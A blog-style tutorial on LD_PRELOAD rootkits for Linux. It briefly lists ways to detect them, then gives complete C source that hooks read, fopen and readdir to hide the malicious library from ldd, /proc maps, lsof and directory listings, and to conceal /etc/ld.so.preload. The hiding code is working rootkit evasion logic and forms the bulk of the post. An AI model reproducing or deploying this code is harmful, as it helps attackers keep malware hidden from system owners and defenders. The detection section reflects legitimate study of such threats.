---
title: How detect a LD_PRELOAD rootkit and hide from ldd & /proc
preview: "https://i.imgur.com/1BZFYCu.png"
description: Learn how to detect and hide a LD_PRELOAD rootkit from ldd, /proc/pid/maps, etc.
categories: [Evasion]
tags: [Rootkit]
author: 0xMatheuZ
---

Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.

- https://discord.gg/66N5ZQppU7


## What is LD_PRELOAD Rootkit?

Before we begin, we need to understand what an `LD_PRELOAD rootkit` is.

- Is a type of malware that uses the `LD_PRELOAD` environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.


## Introduction

A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.

However a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.

And in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.

## Detecting LD_PRELOAD rootkit

Most of the time LD_PRELOAD rootkits can be detected using `ldd /bin/ls`, like this:

- `ldd`: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location.

![imgur](https://i.imgur.com/RJR4VxZ.png)

They can also be found in `/proc/[pid]/maps`.

- `/proc/[pid]/maps`: A file containing the currently mapped memory regions and their access permissions.

![imgur](https://i.imgur.com/OBOYWBW.png)

They can also be easily found in `/proc/[pid]/map_files/`

- `/proc/[pid]/map_files/`: Shows memory-mapped files.

And of course, what you can't miss is checking `/etc/ld.so.preload`

- `/etc/ld.so.preload`: File containing a separate list of shared objects to be loaded before the program.

![imgur](https://i.imgur.com/LR8Abjs.png)

You can also check this using `lsof`.

- `lsof`: Lists files opened by processes and used with -p <PID>, it shows the shared libraries loaded by a specific process.

![imgur](https://i.imgur.com/eIMTdVs.png)

And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.

## Hiding an LD_PRELOAD Rootkit from ldd and /proc

I think that for people who know me, they know that I really like hooking the `read`, and this case will be no different.

Here is a simple code in C:

```
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;

    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
        if (!real_read) {
            errno = ENOSYS;
            return -1;
        }
    }

    ssize_t result = real_read(fd, buf, count);

    if (result > 0) {
        char *start = (char *)buf;
        char *end = start + result;
        char *current = start;

        size_t new_buf_size = result;
        char *new_buf = (char *)malloc(new_buf_size);
        if (!new_buf) {
            errno = ENOMEM;
            return -1;
        }

        size_t new_buf_pos = 0;

        while (current < end) {
            char *line_start = current;
            char *line_end = memchr(current, '\n', end - current);
            if (!line_end) {
                line_end = end;
            } else {
                line_end++;
            }

            if (!memmem(line_start, line_end - line_start, "hook.so", strlen("hook.so"))) {
                size_t line_length = line_end - line_start;
                if (new_buf_pos + line_length > new_buf_size) {
                    new_buf_size = new_buf_pos + line_length;
                    new_buf = (char *)realloc(new_buf, new_buf_size);
                    if (!new_buf) {
                        errno = ENOMEM;
                        return -1;
                    }
                }
                memcpy(new_buf + new_buf_pos, line_start, line_length);
                new_buf_pos += line_length;
            }

            current = line_end;
        }

        memcpy(buf, new_buf, new_buf_pos);
        result = new_buf_pos;

        free(new_buf);
    }

    return result;
}
```

This code implements a hook in the `read` function, intercepting file readings and filtering lines that contain the string `"hook.so"`, using the `dlsym` function to obtain the original version of `read`, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with `"hook.so"` is deleted through functions like `memm` and `memchr`, effectively "hiding" the string by copying only the lines that don't contain it to the final buffer.

Therefore, it is not detected in `ldd` and by any file/directory in `/proc/*`.

Example using `ldd`:

![imgur](https://i.imgur.com/Tj1AdAC.png)

Example using `/proc/pid/maps`:

![imgur](https://i.imgur.com/GAyTLls.png)

Example using `/proc/pid/map_files/`:

![imgur](https://i.imgur.com/zu6MUxe.png)

Example using `lsof`:

![imgur](https://i.imgur.com/iKfp6l0.png)

Example using `cat /etc/ld.so.preload`:

![imgur](https://i.imgur.com/RmLAF2K.png)

This is a simple solution, nothing too advanced, but it is quite effective.

## Hiding from /etc/ld.so.preload

As seen previously, the presented technique works, however, if you do `cat /etc/ld.so.preload`, as expected `hook.so` will not appear, however, if you use `nano`, for example, it will be seen there.

![imgur](https://i.imgur.com/TavmRkV.png)

And that's bad for us.

To do this, we will hook the `fopen`, `read` and `readdir` functions to hide the file `/etc/ld.so.preload`, making it "impossible" to open, read or list in directories, and also causing it to be non-existent, for example, if you do a `cat /etc/ld.so.preload`, it returns `No such file or directory`.

Here is a simple code in C:

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <sys/stat.h>
#include <limits.h>
#include <dirent.h>

#define HIDDEN_FILE "/etc/ld.so.preload"

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen) {
        orig_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    if (strcmp(pathname, HIDDEN_FILE) == 0) {
        errno = ENOENT;
        return NULL;
    }

    return orig_fopen(pathname, mode);
}

ssize_t read(int fd, void *buf, size_t count)
{
    static ssize_t (*orig_read)(int, void *, size_t) = NULL;

    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    char path[PATH_MAX];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char actual_path[PATH_MAX];
    ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1);

    if (len > 0) {
        actual_path[len] = '\0';
        if (strcmp(actual_path, HIDDEN_FILE) == 0) {
            errno = ENOENT;
            return -1;
        }
    }

    return orig_read(fd, buf, count);
}

struct dirent *(*orig_readdir)(DIR *dirp);
struct dirent *readdir(DIR *dirp)
{
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, "ld.so.preload") != 0) {
            return entry;
        }
    }
    return NULL;
}
```

- fopen: This function checks if the file is `/etc/ld.so.preload`, if so, prevents it from opening by returning `NULL` and setting the error to `ENOENT (No such file or directory)`, otherwise, it calls the function fopen original to open other files normally.
##
- read: Before reading, the function checks whether the file associated with the fd (file descriptor) is `/etc/ld.so.preload` (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to `ENOENT`, otherwise it calls the original read function to read other files normally.
##
- readdir: This function reads directory entries and checks if the name of any entry is `ld.so.preload`, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read `ls -lah /etc/ |grep ld.so.preload`.

And then, it becomes more "stealth".

Checking if `ld.so.preload` is listed in `/etc/`:

![imgur](https://i.imgur.com/L42MtGO.png)

Checking if you can see the contents of `/etc/ld.so.preload`:

![imgur](https://i.imgur.com/yyLVoqp.png)

And of course this isn't 100% perfect, but it's cool to understand how this process works.


## Plot Twist

Well... here's a very funny thing, the process of hiding `/etc/ld.so.preload`, presented in the post becomes useless when we use `strace` 😂.

- Strace: Diagnostic, debugging and instructional userspace utility for Linux.

![imgur](https://i.imgur.com/JZBbR8b.png)

This does not work against `strace`, our code cannot hide from it, because it only handles the `read` function, while strace can also monitor system calls at the kernel level, where the `hook.so` is still visible.

## Final consideration

I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on [Twitter](https://twitter.com/MatheuzSecurity).